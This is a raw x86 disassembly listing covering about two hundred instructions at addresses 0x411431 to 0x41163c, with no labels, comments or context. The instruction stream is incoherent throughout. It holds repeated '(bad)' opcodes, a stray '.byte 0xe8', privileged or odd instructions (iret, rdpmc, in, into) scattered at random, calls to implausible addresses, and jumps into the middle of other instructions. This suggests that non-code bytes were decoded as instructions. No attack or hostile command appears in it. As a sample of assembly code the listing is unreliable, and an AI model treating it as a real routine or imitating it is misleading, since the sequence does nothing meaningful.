  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
